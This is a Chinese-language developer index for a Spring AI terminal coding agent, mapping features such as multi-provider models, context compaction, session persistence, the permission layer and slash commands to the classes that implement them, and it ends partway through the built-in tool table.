# 功能实现索引

> 按**用户可见功能**逐项写清「入口 → 关键类 → 实现要点」，用于接手代码、定位改动面。
> 面向使用者的说明在 [README](../README.md) 与 [docs/guide/](guide/)；本文只讲实现。
>
> 类名省略公共前缀 `io.github.javaside.springai.codetui`；`agent.` / `ui.` / `agent.permission.` /
> `agent.media.` / `agent.background.` / `agent.thinking.` 为子包。标 *(lib)* 的来自
> `org.springaicommunity:spring-ai-agent-utils`。

## 速查表

| 功能 | 入口 | 核心实现类 | 详见 |
| --- | --- | --- | --- |
| 启动装配 | `CodeTuiApplication.main` | `AgentTools.build` → `AgentRuntime` | [1](#1-启动与装配) |
| 多模型接入 | `createProviderRegistry` | `ProviderRegistry` + 6 个 `LlmProvider` | [2.1](#21-多-provider-接入) |
| `/model` 切换与记忆 | `CodeTuiView.openModelPicker` | `ModelPreference`、`RequestSelection` | [2.2](#22-模型切换与记忆) |
| 思考/推理档位 | `/model` 二级面板 | `thinking.ThinkingConfigStore` | [2.3](#23-思考推理模式) |
| 超时与重试 | provider 构造期 | `LlmTimeouts`、`RetryingChatModel` | [2.4](#24-超时重试与容错) |
| 一个回合 | `CodingAgent.submit` | 4 个 advisor + 2 个 ChatModel 装饰器 | [3](#3-对话回合) |
| 输入框编辑 | `CodeTuiView.InputBox` | `TextAreaState` *(lib)*、`CharWidth` *(lib)* | [4](#4-输入框与按键) |
| 斜杠命令 | `CodeTuiView.submitInput` | `COMMANDS` 表 | [5](#5-斜杠命令) |
| `/context` | `ui.ContextUsage` | `SessionTokenEstimator`、`TokenUsageAccumulator` | [6.1](#61-context-的数据来源) |
| 自动压缩 / `/compact` | `PreflightCompactionAdvisor` | `BoundedSummarizationCompactionStrategy` | [6.2](#62-自动压缩与-compact) |
| 会话持久化 / `-c` | `FileSessionRepository` | `SessionEvents`、`ui.HistoryReplay` | [7](#7-会话持久化与恢复) |
| 工具体系 | `AgentTools.build` 装饰循环 | `PermissionCallback` → `ToolEventCallback` → `MediaExternalizingCallback` | [8](#8-工具体系) |
| 权限层 | `PermissionCallback.call` | `permission.PermissionEngine` | [9](#9-权限层) |
| MCP | `McpRegistry.init` | `McpConfigLoader`、`McpClientManager` | [10](#10-mcp) |
| 技能 / `/skill` | `ReloadableSkillTool` | `SkillCatalog` | [11](#11-技能) |
| 子 agent | `SubagentTool` | `SubagentRunner`、`SubagentLoader` | [12](#12-子-agent) |
| 后台任务 / `/tasks` | `SubagentTool`(background) | `background.BackgroundTaskRegistry` | [13](#13-后台任务) |
| 回合中插话 | `CodeTuiView.submissionRoute` | `Interjections`、`InterjectingChatModel` | [14](#14-回合中插话) |
| 计划模式 | `PlanApprovalBridge` | `PlanRequest`、`PermissionModePrompt` | [15](#15-计划模式) |
| 问询面板 | `AskUserQuestionTool` *(lib)* | `UserQuestionBridge`、`AskRequest` | [16](#16-问询面板) |
| 视觉输入 | `ui.ImageAttachmentDetector` | `media.VisionMaterializingChatModel` | [17](#17-视觉输入) |
| 长期记忆 | `AutoMemoryTools` *(lib)* | `MemoryPrompt` | [18](#18-长期记忆) |
| 终端注意提示 | `CodeTuiView.advanceAttention` | `ui.AttentionTracker`、`ui.TerminalAttention` | [19](#19-终端注意提示) |
| 系统提示词 | `AgentTools.SYSTEM_TEMPLATE` | `ProjectInstructions`、`MemoryPrompt` | [20](#20-系统提示词组成) |

---

## 1. 启动与装配

`CodeTuiApplication.main` 是唯一入口，装配顺序**本身带约束**，不可随意调换：

1. `createProviderRegistry(root, env, usageAccumulator)` —— 一家 key 都没有则打印提示并 return（不崩栈）。
2. `new ConversationState()`（它 `implements AgentListener`，是 UI 的唯一真相源）。
3. `restoreLastModel(registry, root, state)` —— 必须在 state **之后**（回退提示走 `pushInfo`）、
   在 `AgentTools.build` **之前**（build 会快照 `activeProviderId`）。
4. 会话选择：默认新 id；仅 `-c` / `--continue` 时取 `FileSessionRepository.latestSessionId`。
5. `PermissionEngine` —— **整个进程只有一个**，必须建在 `McpRegistry.init` 之前
   （MCP 工具在 init 里就被发现并装饰）。优先级 `--dangerously-skip-permissions` >
   `--permission-mode` > 配置文件 `defaultMode`。
6. `McpRegistry.init(root, state, engine)` —— **立即返回**，连接在后台跑（实测一个远程 HTTP
   server 要 5~8 秒）。「已发现 N 个工具」那行由 `onMcpReady` 回调补上。
7. `AgentTools.build(...)` → `AgentRuntime`（16 字段 record）→ `new CodingAgent(...)`。
8. `resumed` 时 `state.replayHistory(...)` 回放历史进 scrollback。
9. `new CodeTuiView(state, agent, root).run()`，全程 try/finally 关 MCP。
10. `System.exit(exitCode)` —— 必须强制退，OkHttp Dispatcher 线程 keep-alive 60s。

启动参数：`-c` / `--continue`、`--permission-mode <default|acceptEdits|plan>`、
`--dangerously-skip-permissions`。`--permission-mode` **刻意不认 `bypass`**（启动即裸奔只该有
一个显眼开关）。

---

## 2. 模型接入

### 2.1 多 provider 接入

入口 `CodeTuiApplication.createProviderRegistry` → `ProviderRegistry` + 6 个 `LlmProvider` 实现。

列表序即优先级（决定默认激活与旧格式偏好回退）：
`DeepSeekProvider → ZhipuProvider → QwenProvider → AnthropicProvider → OpenAiProvider → OpencodeGoProvider`。

- `available()` 一律是 `!apiKey.isBlank()`；`chatModel()` 懒建 + `volatile` 单例。
- 底层分两类：原生 SDK（DeepSeek、Anthropic）与 OpenAI 兼容通路（其余四家复用
  `OpenAiChatModel`，只换 baseUrl；同时装 sync + async client，前者给子 agent 阻塞 `call`）。
- `ModelOption`(id/label/desc) 是单家清单项，`ProviderModel`(+providerId) 是聚合时钉上归属的条目
  —— DeepSeek 原生与 OpenCode Go 网关都提供同名模型，裸 modelId 会串号。
- 自定义清单 `ModelListEnv.parse(*_MODELS, 内置)`：逗号分隔，**首项即 `defaultModel()`**。

各家差异（详情见各 provider 类注释）：

| provider | 关键差异 |
| --- | --- |
| DeepSeek | 思考/视觉都无 native 支持，靠 HTTP 层改写请求体，见 [2.3](#23-思考推理模式)、[17.3](#173-deepseek-专属通道) |
| Qwen | `QwenSseNormalizingHttpClient` 修流式 tool_calls 的 `"id":""` 空串（不修则一触发工具调用即崩，spring-ai#4629） |
| Zhipu | baseUrl 必须写到 `/api/paas/v4`；模型名须全小写（大写 404） |
| Anthropic | `model()` 收 typed 枚举须 `Model.of()`；`max_tokens` 必填，默认与每请求都显式带 8192 |
| OpenCode Go | 聚合网关；实测不可用的模型不下发清单；思考档位按 modelId 逐个实测收录 |

### 2.2 模型切换与记忆

`/model` → `CodeTuiView.openModelPicker` → `onModelPickerKey` → `CodingAgent.selectModel` →
`ProviderRegistry.select(providerId, modelId)`（未知模型**静默忽略**）→ `ModelPreference.write`
落 `<root>/.codetui/model.json`。

启动恢复 `CodeTuiApplication.restoreLastModel`：新格式 `{providerId, modelId}` 精确恢复，
旧格式裸 `lastModel` 命中列表序靠前那家。恢复失败 `pushInfo` 提示回退，
**刻意不清盘上记录**（临时注释掉一个 key 跑一次，不该让记忆消失）。

每回合生效：`CodingAgent.submit` 取 `registry.activeRequestSelection()` **单快照**，
一次拿到 provider / modelId / ThinkingConfig / ChatOptions，避免与并发 `/model` 交错。
`select*` 与 `*RequestSelection` 全部 `synchronized`。

### 2.3 思考/推理模式

`thinking/` 包 6 个类：`ThinkingMode`(DEFAULT/ENABLED/DISABLED)、`ThinkingConfig`、
`ThinkingStrengthKind`、`ThinkingCapabilities`、`ModelThinkingSettings`、`ThinkingConfigStore`。

- 持久化 `<root>/.codetui/thinking.json`，`put(mode=DEFAULT)` 语义是**删记录**。
- 请求期 `effectiveConfig()` 先 `validate`，不兼容则降级 `defaults()` + WARN、**原记录保留**。
- 各家落法：zhipu `extraBody.thinking.type` + `reasoningEffort`；qwen `enable_thinking` +
  `thinking_budget`；openai/opencode-go `reasoningEffort`（DISABLED → `"none"`）；
  anthropic `thinkingDisabled/thinkingAdaptive`；**deepseek 无 native 字段**，
  返回自有包装 `DeepSeekThinkingChatOptions` 由 HTTP 层改写 body。
- `DeepSeekThinkingChatOptions` 必须实现 `ToolCallingChatOptions` 而非裸 `ChatOptions`——否则
  `combineWith` 匹配不上任何 Builder，模型与思考配置静默丢失，且 `ToolCallingAdvisor` 整个跳过、
  **工具全丢**。
- 辅助路径（`DynamicAuxChatModel`）契约是永远 DEFAULT，有守卫测试钉住。

### 2.4 超时、重试与容错

| 层 | 类 | 要点 |
| --- | --- | --- |
| 超时配置 | `LlmTimeouts` / `OpenAiTimeouts` | 只读 `CODETUI_LLM_READ_TIMEOUT_SECONDS`，默认 300s 钳 [10,3600]；OpenAI 家族必须设在 `ClientOptions.timeout` 而非基础 OkHttpClient |
| 流式空闲超时 | `StreamIdleTimeoutProvider` → `StreamIdleTimeoutChatModel` | 只在 `stream()` 挂 `.timeout()`，语义是「相邻两 chunk 之间」而非总时长 |
| 子 agent 重试 | `RetryingChatModel` | 5 次、退避 500ms×2ⁿ 封顶 4s；**把阻塞 `call` 桥接到流式**（代理网关非流式端点有分钟级坏窗口）；4xx 与 `InterruptedException` 是红线 |
| 工具名错 | `ResilientToolCallingManager` | 只拦 `No ToolCallback found`，按 tool call 顺序区分「已执行未回传/不存在/未执行」三种状态回给模型 |
| 工具异常 | `ResilientToolExecutionExceptionProcessor` | 任何工具异常转文本、**绝不 rethrow**；带 cause 链 + 栈前 6 帧 |
| 工具超时 | `TimeLimitedToolCallback` | daemon 池 + `future.get(timeout)`；**ThreadLocal 不跨线程**，内层拿不到 turnId，目前只用于 Brave |

### 2.5 用量采集

`UsageRecordingProvider` → `UsageRecordingChatModel` → `TokenUsageAccumulator`(4 个 `LongAdder`)
→ `CacheUsageExtractor`。主 agent / 子 agent / 摘要**共用同一个累加器实例**。

两处易错实现：流式 `doOnNext` **只记最新 usage**（Spring AI 每 chunk 带累计值，杜绝重复计数）；
提交用 `doOnTerminate` + `doOnCancel` 而**不用** `doFinally`（后者跑在 `onComplete` 之后，
`blockLast` 返回时快照仍是 0）。

`CacheUsageExtractor` 优先读标准 `getCacheReadInputTokens/getCacheWriteInputTokens`，
DeepSeek 未填则从 `getNativeUsage()` 的 `promptTokensDetails().cachedTokens()` 兜底。
DeepSeek 流式能拿到 usage 的前提是 `DeepSeekThinkingBodyCodec.injectStreamOptions` 强制注入
`stream_options.include_usage=true`。

### 2.6 装饰器嵌套顺序

```
provider 层（CodeTuiApplication.wrap）
  UsageRecordingProvider( StreamIdleTimeoutProvider( 真 provider ) )
  └ 空闲超时在采集内层：超时错误往外传时先经过 doOnTerminate，保住最后一笔 usage

主 agent（AgentTools.build，每个可用 provider 一条）
  InterjectingChatModel( VisionMaterializingChatModel( provider.chatModel() ) )
  └ 视觉兑现必须在会话记忆之后、真正发出之前；插话必须在最外层（拿已配平的完整消息表）

子 agent（SubagentRunner.execute）
  RetryingChatModel( provider.chatModel() )        ← 无 Vision / 无 Interjecting

辅助（webFetch 抽取 + 滚动摘要）
  DynamicAuxChatModel                              ← 刻意不包任何装饰器，有守卫测试

DeepSeek 内部（DeepSeekProvider.chatModel）
  DeepSeekThinkingChatModel( 按 ThinkingConfig 缓存的 DeepSeekChatModel )
```

### 2.7 上下文窗口

`ModelContextWindows.resolve(providerId, modelId)` 四级：显式 `CODETUI_CONTEXT_WINDOWS` 覆盖 →
内置表 → **按 modelId 后缀同名回退**（为聚合网关命中原厂条目，多命中且值矛盾就不猜）→
`CODETUI_UNKNOWN_CONTEXT_WINDOW`（默认 128k）。

消费点 `AgentTools.modelSnapshot(registry)` 同样用单快照，避免「A 家区间配 B 家窗口」。

---

## 3. 对话回合

入口 `CodingAgent.submit(text, skillName)`，返回 `Disposable` 供 Esc 用。步骤顺序有约束：

| 步 | 动作 | 为什么在这个位置 |
| --- | --- | --- |
| a | `turnId = activeTurnId.incrementAndGet()` | turnId 由 CodingAgent 独占 |
| b | `trimDanglingToolCalls()` | 出站净化：会话常驻内存永不重载，每回合兜底一次 |
| c | `externalizeSessionFiles()` | 把过往携带文件全文的 tool 结果换成引用 |
| d | `listener.onTurnStarted(turnId)` | **同步**调用，先锁定 `acceptingTurnId`，消除取消竞态 |
| e | `listener.onUserMessage(turnId, text)` | UI 只显示**原文**，后续注入只影响发给模型的文本 |
| f | `injectSkill(...)` | `/skill` 手动挂载，正文包成 `<skill_instruction>` 前置 |
| g | `foldTrailingUserIntoOutbound(...)` | 历史尾部残留 user 时折进出站文本——`SessionMemoryAdvisor.before` 会无条件再追加一条，两条连续 user 被 DeepSeek 400 |
| h | `registry.activeRequestSelection()` | 单快照，见 [2.2](#22-模型切换与记忆) |
| i | 组 prompt | MCP 工具**仅非空才** `.tools(...)`（空数组会覆盖 `defaultTools`，内置工具全不可见）；`.system(AGENT_MODEL + PERMISSION_MODE)` 每回合重算 |
| j | `.stream().chatClientResponse()` + 四钩子 | `doOnNext→handleChunk`、`doOnError`、`doOnComplete→handleComplete`、`doOnCancel→trimDanglingToolCalls` |
| k | `Disposables.composite(reactive, () -> subagentRunner.cancelTurn(turnId))` | Reactor 取消不 interrupt 阻塞在网络 IO 的子 agent 线程 |
| l | 同步段 `catch RuntimeException` → `onError` + `Disposables.disposed()` | 否则 UI 永卡 THINKING |

### advisor 链（order 决定顺序，不是数组顺序）

```
PreflightCompactionAdvisor      HIGHEST + 999    ← 最外层，压缩发生在历史注入之前
SessionMemoryAdvisor (lib)      HIGHEST + 1000   ← before() 追加 user + 注入历史；after() 落盘 assistant
SessionIdStreamGuardAdvisor     HIGHEST + 1001   ← 补一条携 context 的空 assistant，修 OpenAI 空流
ToolCallingAdvisor (lib)                          ← 装了 ResilientToolCallingManager
ChatModelStreamAdvisor          LOWEST
  └ InterjectingChatModel
     └ VisionMaterializingChatModel
        └ provider.chatModel()（已被 UsageRecording → StreamIdleTimeout 包过）
```

### 流式回 UI

`handleChunk` 全链路 null-guard 抽 delta → `listener.onAssistantToken(turnId, delta)` →
`ConversationState.onAssistantToken`（`turnId != acceptingTurnId` 直接丢弃）→ 追加进 `streaming`
缓冲 + 锁外 dirty 通知（数千 token 经 `UiUpdateCoordinator` 合并，至多一个在飞 UI update）→
UI 批 `processUpdates` 调 `takeCompleteStreamingLines()`（按真实 `\n` 切，残行只做预览）→
`ScrollbackPrinter.streamingLine`。Spring AI 类型不出 `CodingAgent`（三个 handler 全私有）。

### 回合结束与取消

`handleComplete`：`persistInterjection()` **必须先于** `onTurnComplete`——UI 出队钩子靠 `!busy()`
放行，反了会让新回合的 user 先写入、anchor 插入错位。

Esc 取消链路见 [14](#14-回合中插话) 末段与 [4](#4-输入框与按键)。核心是 `state.cancelCurrent()`
把 `clearModals()` 放最前（唯一调外部代码的一步，排前面保证后续异常不会把阻塞线程留在队列里）。

---

## 4. 输入框与按键

`CodeTuiView extends InlineApp`(tamboui)，只覆盖四个钩子：`height()`(空态 4)、`render()`、
`configure(int)`、`onStart()`。

### 渲染模型

- `render()` 只在被请求时重建整棵 `column(...)`（事件驱动，见下方「事件驱动链路」）。
  `scope(cond, children)` 隐藏时 `preferredSize=0`
  → 视口收缩 → 行被回收，这是「面板用完即收起」的全部机制。
  **第二参数每次渲染 eager 求值**，所以所有 `xxxChildren()` 首行必须判空。
- 两条通道严格分离：live 区（输入框 + 面板 + 状态行）由 tamboui 按请求差分重绘；scrollback 由
  UI 批（`processUpdates`）在**渲染线程、两帧之间**用 `runner().println` 推进。不变量是
  「一个 println = 一个物理行」，所有出口先经 `TextWrap.wrap` 折行（`InlineDisplay.println`
  超宽是**截断**而非折行）。
- 空闲静态界面**零周期任务、零 ANSI 输出**（PTY 冒烟有 idle 零字节断言钉住）：
  常驻 100ms tick（`tickRate`）与 66ms drain 两个周期任务已删除，重绘/输出全部由事件唤醒。
- 输出节流参数都有实测理由：每个 UI 批最多 300 物理行 + 12ms 时间预算
  （防 pty 突发触发 Terminal.app 的 GCD use-after-free、防渲染线程长占把按键排队）、
  流式残行预览 150ms（高频 ANSI 打断 IME 合成）、动画帧 66ms 仅忙态续排。

#### 事件驱动链路（Task 1–10 重构后的当前架构）

```text
Agent/source mutation          Agent 线程 / 工具线程 / MCP 后台线程改状态
  -> durable state/queue       ConversationState + Interjections/SubagentRunner/
                               BackgroundTaskRegistry/McpRegistry（真相源，含迟到过滤）
  -> lock-free dirty notify    锁内只改数据 + 记 dirty bits，锁外调 onUiChanged(bits)
  -> UiUpdateCoordinator       原子 OR 合并；CAS 赢家才投递（数千 token → 至多一个在飞 update）
  -> InlineTuiRunner wake      requestUiUpdate 入事件队列并唤醒（合并、无事件对象）
  -> bounded processUpdates    UI 线程一批：行/时间双预算消费输出 + 模态同步 + attention +
                               自动出队，绝不循环到空
  -> one-shot continuation/    输出未清空 → ZERO 延迟续批；preview/动画帧/resize settle
     render                    全是按需一次性 timer；批尾恰好一次差分 render
```

要点：dirty bits 只是「该做哪段」的提示，真相永远从 state 回读；四类一次性任务
（continuation / preview / resize / animation）每类至多一个在飞 generation，状态消失即取消；
本地 UI 状态（按键改高亮、notice 等）由 `publishLocalViewChange` 主动 `onUiChanged(VIEW)`
+ `requestRender`，不等 Agent 事件。

- `InlineRenderBatch.open(runner)` 反射调 `beginPrintBatch/endPrintBatch` 把一个 UI 批的所有
  println 合成一次提交，失败静默降级。
- resize：`onStart` 只**旁观** `ResizeEvent`（返回 UNHANDLED，库还要靠它触发重画），
  settle 由 `UiUpdateCoordinator.scheduleResizeSettle` 的 **132ms 一次性任务**
  （generation 替换：连发只重放最后一次）触发 `replayAfterResize()`：`ScreenCleaner.clear` +
  `scrollTail`（`SCROLL_TAIL_CAP=400` 条环形留底，存**折行前**原始行）按新宽度全量重放（幂等）。
  旧的 `ResizeSettle(4)` 帧计数判定器已随每帧 tick 删除（没有 tick 可喂拍）。
- `parkCursorAtTop`：平时硬件光标停在文本行（IME 预编辑串的锚点），仅 resize 窗口内钉第 0 行。

### 输入框

`InputBox` 自绘而非用 `textArea` 元素：后者 `isFocusable()` 恒 true 会抢焦点，
路由器对焦点元素先调内建 `handleKeyEvent`（把 Enter 当换行并返回 HANDLED），外层发送逻辑轮不到。
做法是自己实现 + 固定 id，按键先给 `onInputKey` 拦，未拦截的转交一个**从不渲染**的
`textArea(inputState)` 复用其编辑键处理。

| 功能 | 实现 |
| --- | --- |
| 宽字符对齐 | `wrapSegments` 用 `CharWidth.substringByWidth` 按显示宽度折行；光标列用 `CharWidth.of(前缀)` 算 |
| 按词跳/删 | `onEditShortcut` 用 `TextAreaState` 单步原语循环组合（该类无按词 API）。**移动边界与删除边界口径刻意不同**：移动按「字母数字下划线成词、CJK 每字自成一词」，删除按 readline `unix-word-rubout` 以空白为界 |
| `\`+Enter 换行 | `cursorAfterBackslash()` → `deleteBackward()` + `insert('\n')`。`Shift/Alt+Enter` 也支持但 Apple Terminal 区分不了修饰键 |
| 历史回溯 | `history` + `histIndex`(== size 为草稿态) + `histDraft`。已在回溯态时 ↑↓ **优先于斜杠菜单** |
| Shift+Tab 切权限档 | `configure()` 必须 `unbind(FOCUS_NEXT/FOCUS_PREVIOUS)`——路由器把焦点导航排最前，命中后即便失败也 return UNHANDLED，不解绑则 Shift+Tab、斜杠菜单 Tab 补全、MCP 面板 Tab 展开**全是死的** |
| Ctrl+X 取消图片附件 | 刻意不用 Ctrl+G（Chrome Gemini 扩展抢成 OS 全局热键） |

权限档位常驻可见性：`modeTag(mode)` 返回带色 `Span` 插在状态行**行首**（尾部会先被截断，
而「现在会不会问你」比「Esc 取消」更不该被截掉）；DEFAULT 返回 null 不占位。

---

## 5. 斜杠命令

入口 `CodeTuiView.submitInput()`，全部在纯字符串比较链上（顺序即优先级），各分支自己
`clearInput()` 后 return。补全菜单激活条件 `typingSlashToken()`（以 `/` 开头、单行、**尚无空格**）。

命令表 `COMMANDS` 有一条排序纪律：**`/skill` 必须排在 `/skills` 前**，否则输入 `/skill` 回车
会被首个匹配项抢走。

| 命令 | 处理方法 | 闸门 |
| --- | --- | --- |
| `/model` | `openModelPicker()` | — |
| `/compact` | `onSubmit.compact()` | 要求空闲；已压缩中静默返回 |
| `/clear` | `killAllBackgroundTasks()` + `clearContext()` + `resetForNewSession()` + 清屏 | `!isBusy()`；**杀任务必须在 reset 之前、闸门之后** |
| `/context` | `ctxUsage.report()` | 无（任何时刻可查） |
| `/skill` | `openSkillPicker()` | — |
| `/skills` | `printSkills()` | 无 |
| `/reload` | `reloadSkills()` | — |
| `/mcp` | `openMcpPicker()` | 仅空闲 |
| `/permissions` | `printPermissions()` + `openPermsPanel()` | 无 |
| `/tasks` | `openTasksPanel()` | **刻意无闸门**（后台任务与回合两套线程，忙时恰是最想看的时刻） |
| `/continue` | 固定提示词 + `backgroundDigestForContinue()` | 忙则 enqueue |
| `/queue <msg>` | 取 body 后 enqueue/dispatch | 刻意用斜杠命令而非 Alt+Enter（终端区分不了修饰键会静默错路由成插话） |
| `/help` `/exit` `/quit` | `printHelp()` / `shutdownAndQuit()` | — |

附件识别分支**必须排在所有命令之后**（否则 `/help docs/bug.png` 也会被识别成带图），
且在 `clearInput()` **之前**（否则 `attachmentsCancelled` 被复位、Ctrl+X 失效）。

### 面板抽象：两套，边界清楚

**本地选择器**（`/model`、思考设置、`/skill`、`/mcp`、`/permissions`、`/tasks`）——纯 UI 态，
统一四件套：一个 `boolean picking*` 字段 + `render()` 里一行 `scope` + `onInputKey` 里一行前置分派
（键处理器**始终返回 HANDLED**，屏蔽全部文本编辑）+ `statusLine()` 里一行。
共享约定：`clampIndex` 夹下标、↑↓ 移动、`1-9` **只移高亮不隐式确认**、Esc 关闭、空列表直接 return
防除零。面板态状态行必须**自己回显 notice**（面板分支早于通用 notice 分支 return）。

差异点各有理由：`/permissions` 删除键是 `d` 且两段式确认（「删 deny 等于放宽权限，不该和顺手回车
共用一个键」）；`/tasks` 的 `k` 是终止键因而**刻意不提供 j/k 移动**；`/mcp` 启用走**后台 daemon
线程**（连接秒级，不能冻渲染循环）。

**模态请求**（审批 / 计划 / 问询）——背后各有一个阻塞的工具线程且它持着回合，完全不同的抽象：

- `sealed interface ModalRequest permits AskRequest, PermissionRequest, PlanRequest`，
  只有 `turnId()` 与 `cancel()`。sealed 要求同包，这就是 `PermissionRequest` 放在 `agent/`
  而非 `agent/permission/` 的原因。编译在 release=17，消费方一律 `instanceof` 链。
- `ConversationState` 持一条 `Deque<ModalRequest>`，容量 8。用队列而非单字段：`ParallelTasks`
  下多个子 agent 可能同时判出 ASK，单字段会让后来者覆盖前者、被覆盖那个线程**永久 park**。
- 三条入队回调都做迟到过滤且**每条路径必须应答**：问询迟到/队满 → `cancel()`；
  审批 → `DENY`（比 CANCEL 轻，回合继续）+ 队满时打一行可见 ERROR；计划迟到 → `CANCEL`、
  队满 → `KEEP_PLANNING`。
- UI 在每个 UI 批（`processUpdates`）里 `peekModal()`，用**引用比较**判队首身份变化。新增子类型必须在这里补分支，
  漏了不报错、后果是面板永不弹出、工具线程永久 park。
- 三条键处理器守同一纪律：**不得存在「既不应答也不取消」的出口**。退出统一
  **先 `removeModal(req)` 再应答**；CANCEL 交给共用的 `cancelTurnFor(req, notice)`。
- 计划正文**不进面板**（几十行会把输入框顶出屏幕），逐行 `printer.assistant` 下沉 scrollback，
  面板只放选项。

---

## 6. 上下文管理

### 6.1 `/context` 的数据来源

入口 `/context` → `ui.ContextUsage.report()` → `CodingAgent.contextStats()` → `ContextStats`。

- `sid` **快照一次**（两次读会被 `/clear` 换 volatile 撕裂）。
- 事件分桶：遍历 `getEvents(sid)` 按 `MessageType` 数 user/assistant/tool/other。
- token 分桶：`SessionTokenEstimator.estimateMessagesByType(...)`，**分桶与总数出自同一次遍历**，
  保证「总数 == 各分类之和」恒成立。单条口径 = text + `ToolResponseMessage` 各 responseData +
  assistant 各 tool_call 的 name+arguments。
- 视觉：按**激活 provider** 取 `VisionMaterializingChatModel.lastSnapshot()`——每家一个装饰器
  各记各的账，取错家会报陈旧但**看起来完全合理**的数字。
- `systemPromptTokens`：装配期一次性估算（把模板 param 填成与 `defaultSystem` 同源的文本再 estimate）。
- 缓存命中率：`usageAccumulator.snapshot()`，`promptTokens == 0` 返回 **null**（UI 整行不打印）。

**三笔账刻意分开**：`estimatedTokens` 只含会话存储文本；`visionTokens` 不含（图片从不进存储）；
`systemPromptTokens` 也不含（烘焙在 ChatClient）。合并会让「压缩阈值为什么没触发」无法解释。

渲染细节：「上下文占用」= `estimatedTokens + systemPromptTokens`（与状态栏百分比**同一分母**）；
构成百分比走 largest-remainder 分配、**合计恒 100%**；自动压缩行的分子刻意用 `estimatedTokens`
（不含系统提示词，与上方消息项之和对得上账）。

`refresh()` 由 `ContextUsageRefreshController` 按需触发（影响统计的事件标脏 + 500ms 防抖 + 单飞），
**必须在独立线程池跑**（大会话下估算耗时数百 ms）。

### 6.2 自动压缩与 `/compact`

**阈值**（`AgentTools`）：触发线 `max(32k, window × 0.70)`；自动目标预算
`max(8k, window × 0.55 − 16k)`；手动 `max(8k, window / 4 − 16k)`（16k 是给附件清单预留）。
三个预算都是 `LongSupplier`，`/model` 切换后下一次压缩立即跟随。

判定口径 `CompleteTokenCountTrigger`：`SessionTokenEstimator.estimateEvents(...) >= threshold`。

| 路径 | 触发 | 策略装饰 |
| --- | --- | --- |
| 自动 | `PreflightCompactionAdvisor`（`Flux.defer` 里，位置在 `SessionMemoryAdvisor` **之前**） | `Notifying( MediaReferencePreserving( Bounded ) )` —— Notifying 在最外层，报的是加清单后的净效果 |
| 手动 | `CodingAgent.compact()` → daemon 线程 → `sessionService.compact(sid, req -> true, manualStrategy)` | `MediaReferencePreserving( Bounded )`，**刻意不包 Notifying**（否则同一次失败上报两遍） |

手动路径自行发 started/finished 事件；`catch Error` 时先清状态再重抛（否则 UI 永卡「压缩中」、
`isBusy()` 恒真）。

`BoundedSummarizationCompactionStrategy` 的校准模式（生产走这条）：

- `CalibrationState` 按 `"provider:model"` 维护 `Interval(knownGood, goodProven, knownBad)`，
  进程内共享、**不持久化**、auto/manual 用**同一实例**（`/compact` 学到的容量立即被自动压缩复用）。
- 分支：已验证安全或中间区 → 乐观全量一次调用；失败先问 `SummarizerOverflow.isOverflow`
  （遍历 cause chain 匹配 8 个特征串）——**不是超限就落本地兜底，绝不拿网络错误调预算**。
- 是超限 → `parseWindowTokens` 按**锚定窗口值**的正则解析（Anthropic 那句里的数字是请求量，
  取错会钉在还会失败的水平）；无数字则减半探测（深度 ≤4）。
- `knownBad` 短路：**绝不重发注定失败的全量**。
- 三重安全阀（预算 <16k / 块数 >8 / 深度 >4）任一触发落 `localDigest` 纯本地摘要。

**回写形状**：`synthetic UserMessage("[Earlier conversation summary]")` +
`synthetic AssistantMessage(merged)` + `kept`，经 `replaceEvents` **覆盖写回**——压缩是
**销毁式**的，`archivedEvents` 从不落库（这也是不挂 `conversation_search` 工具的理由）。

`MediaReferencePreservingCompactionStrategy` 从 `archivedEvents`（**不是** `request.events()`，
否则清单随每次压缩膨胀）逐字捞 `<file_reference>`，渲成「会话附件清单」插到**最前**并打
`SYNTHETIC_KEY`（不打会成为「最后一条非合成 UserMessage」把视觉兑现锚点带偏）。保留最近 20 条，
超出**如实说明丢了多少**；计数原样透传，不编造。

---

## 7. 会话持久化与恢复

`FileSessionRepository`，目录 `<root>/.codetui/sessions/`，一 session 一 JSON。
按项目隔离靠 `root = user.dir`（记忆、artifacts、权限、MCP、模型偏好同级）。

- id 格式 `SessionIds.newId()` = UTC `uuuuMMdd'T'HHmmss` + `-` + UUID 前 6 位。
- 落盘范式照 `JdbcSessionRepository`：assistant 的 tool_calls 拆 `ToolCallDto`，
  tool 结果拆 `ToolResponseDto`。**原子写**（tmp + `ATOMIC_MOVE`，不支持则降级），
  IO 失败只 `log.warn`、**绝不写 stdout**（会撕 TUI）。
- **惰性加载**：构造函数不扫盘，各读写方法 `computeIfAbsent(sid, this::loadFromDisk)`。
  默认启动（新 id）根本不碰盘；坏文件 WARN 后视为不存在。
- **加载即净化**：`loadFromDisk` 末尾跑 `SessionEvents.sanitize`，三遍纯函数流水线，
  每遍无改动返回**同一引用**：
  1. `removeOrphanToolResults` —— 维护 open 集合，剔除无配对的 tool 结果；
  2. `collapseConsecutiveSameRole` —— 折叠相邻 user 与相邻**普通** assistant；
     `ToolResponseMessage` 与带 tool_calls 的 assistant **永不参与合并**。
     排在删孤儿之后，因为删掉夹在两 user 间的孤儿会新暴露连续 user；
  3. `trimToCleanPrefix` —— 裁尾部悬空 tool_calls。

`-c` 恢复链路：`hasContinueFlag` → `latestSessionId`（只扫文件名 + mtime，不解析全文）→
`sessionId` → `state.replayHistory(getMessages(sessionId))`（首次访问触发 load + sanitize）。

回放渲染 `ui.HistoryReplay.toReplayLines` 要**依次剥掉三种注入**：`InterjectionText.unwrap`
（包裹里那段是给模型的行为指引，不剥就成了「用户说过这句话」）、`stripSkillInstruction`、
`stripFileReferences`（渲成一行 `📎 name (w×h)`）——会话持久化的是「注入后」文本而实时 UI
显示的是原文。ASSISTANT 按 `\n` **逐行**拆（`printer.assistant` 只处理单行）；
tool_call 渲 `⏺ name 摘要` 且 `raw=null`（**不重绘 diff**，历史里的原文件可能早已改变）。

`/clear` → `CodingAgent.clearContext()` 只换 volatile `sessionId`（下一回合自动建空会话），
**旧文件原样保留可 `-c` 恢复**；顺带 `usageAccumulator.reset()`、`clearSessionRules()`、
`interjections.drainForRefill()`。

所有跑在 reactive/后台线程的会话写入方法都**先把 `sessionId` 快照到局部变量**——防 UI 线程的
`/clear` 在两次读之间换掉 volatile，把旧会话的净化结果写进新会话 id。

---

## 8. 工具体系

装配入口 `AgentTools.build`，产物 `AgentRuntime`（16 字段 record，`client()` = `clients.get(activeProviderId)`）。

### 8.1 内置工具清单

| 注册名 | 来源 | 备注 |
| --- | --- | --- |
| `Read` `Write` `Edit` | `FileSystemTools` *(lib)* | |
